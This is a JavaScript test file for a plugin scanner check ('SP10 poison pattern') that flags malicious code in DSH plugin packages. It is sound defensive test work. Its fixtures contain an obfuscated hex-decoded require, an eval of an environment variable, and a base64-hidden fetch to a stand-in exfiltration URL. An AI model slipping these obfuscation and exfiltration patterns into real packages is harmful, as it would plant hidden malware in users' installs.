/**
 * SP10: Poison Pattern 测试
 * 出处：dsh-poison-guard regex 层。
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { run, sp10Check } from '../src/checks/sp10-poison-pattern.mjs';

function tmp() { return mkdtempSync(join(tmpdir(), 'dsh-security-sp10-')); }

function writePlugin(dir, name, files) {
  const pkgDir = join(dir, 'node_modules', name);
  mkdirSync(pkgDir, { recursive: true });
  writeFileSync(join(pkgDir, 'package.json'), JSON.stringify({ name, dsh: { bundle: {} } }));
  for (const [fname, content] of Object.entries(files)) {
    const fdir = join(pkgDir, fname.split('/').slice(0, -1).join('/'));
    mkdirSync(fdir, { recursive: true });
    writeFileSync(join(pkgDir, fname), content);
  }
}

test('SP10 元数据：ID=SP10/严重度=high', () => {
  assert.equal(sp10Check.id, 'SP10');
  assert.equal(sp10Check.severity, 'high');
});

test('SP10: 无 node_modules → pass', async () => {
  const r = await run(tmp());
  assert.equal(r.ok, true);
});

test('SP10: 干净插件 → pass', async () => {
  const dir = tmp();
  writePlugin(dir, 'dsh-clean', { 'index.js': 'console.log("hello");\n' });
  const r = await run(dir);
  assert.equal(r.ok, true, `detail=${r.detail}`);
  rmSync(dir, { recursive: true, force: true });
});

test('SP10: Buffer.from(hex) 去混淆 → fail', async () => {
  const dir = tmp();
  writePlugin(dir, 'dsh-suspect', {
    'loader.js': 'const fs = require(Buffer.from("6673", "hex"));\n',
  });
  const r = await run(dir);
  assert.equal(r.ok, false);
  assert.ok(r.detail.includes('deobfuscated-import'), `detail=${r.detail}`);
  assert.ok(r.references.includes('#2312'));
  rmSync(dir, { recursive: true, force: true });
});

test('SP10: eval() → fail', async () => {
  const dir = tmp();
  writePlugin(dir, 'dsh-eval', {
    'hack.js': 'eval(process.env.EVIL_CODE);\n',
  });
  const r = await run(dir);
  assert.equal(r.ok, false);
  assert.ok(r.detail.includes('eval-execution'), `detail=${r.detail}`);
  rmSync(dir, { recursive: true, force: true });
});

test('SP10: atob 隐藏 URL → fail', async () => {
  const dir = tmp();
  writePlugin(dir, 'dsh-atob', {
    'c2.js': 'fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXhmaWw="));\n',
  });
  const r = await run(dir);
  assert.equal(r.ok, false);
  assert.ok(r.detail.includes('hidden-url-atob'), `detail=${r.detail}`);
  rmSync(dir, { recursive: true, force: true });
});

test('SP10: 非 DSH 插件不扫描', async () => {
  const dir = tmp();
  const pkgDir = join(dir, 'node_modules', 'not-a-plugin');
  mkdirSync(pkgDir, { recursive: true });
  writeFileSync(join(pkgDir, 'package.json'), JSON.stringify({ name: 'not-a-plugin' }));
  writeFileSync(join(pkgDir, 'bad.js'), 'eval("evil");\n');
  const r = await run(dir);
  assert.equal(r.ok, true, '非 DSH 插件不应被扫');
  rmSync(dir, { recursive: true, force: true });
});
